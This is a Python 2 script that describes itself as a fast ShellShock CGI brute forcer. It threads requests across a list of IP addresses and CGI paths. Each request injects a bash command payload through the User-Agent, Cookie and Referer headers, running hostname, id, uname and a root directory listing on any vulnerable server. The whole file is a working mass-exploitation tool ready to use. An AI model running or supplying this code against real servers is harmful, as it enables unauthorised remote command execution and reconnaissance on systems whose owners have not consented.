#!/usr/bin/env python
#Uses lists from RAFT and detectify.com
#Forked from Peter Kim
#Description: Fast ShellShock CGI bin brute forcer

from urlparse import urlparse
from threading import Thread
import httplib, sys
from Queue import Queue

concurrent = 200

def doWork():
    while True:
        url = q.get()
        status, url = getStatus(url)
        doSomethingWithResult(status, url)
        q.task_done()

def getStatus(ourl):

    USER_AGENT = "() { foo;};echo;/bin/bash -c '/bin/hostname --fqdn;/bin/ls -la /;'"
    Cookie = "() { foo;};echo;/bin/bash -c '/bin/hostname --fqdn;/bin/ls -la /;'"
    Host = "() { foo;};echo;/bin/bash -c '/bin/hostname --fqdn;/bin/ls -la /;'"
    Referer = "() { foo;};echo;/bin/bash -c '/bin/hostname --fqdn;/bin/uname -a;/usr/bin/id;/bin/ls -la /;'"
    try:
     url = urlparse(ourl)
     print url
     conn = httplib.HTTPConnection(url.netloc)   
     conn.putrequest("GET", url.path)
     conn.putheader("User-Agent", USER_AGENT)
     conn.putheader("Cookie", Cookie)
     conn.putheader("Referer", Referer)
     conn.endheaders()
     res = conn.getresponse()
     return res.status, ourl
    except:
     return "error", ourl

def doSomethingWithResult(status, url):
    print status, url

q = Queue(concurrent * 2)
for i in range(concurrent):
    t = Thread(target=doWork)
    t.daemon = True
    t.start()
try:
    for url in open('iplist.txt'):
        if "http" not in url:
	 url = "http://" + url.strip()
	else:
	 url = url.strip()
	for file in open('Updated_list_Cgi_files.txt'):
        	q.put(url.strip() + file.strip())
    q.join()
except KeyboardInterrupt:
    sys.exit(1)
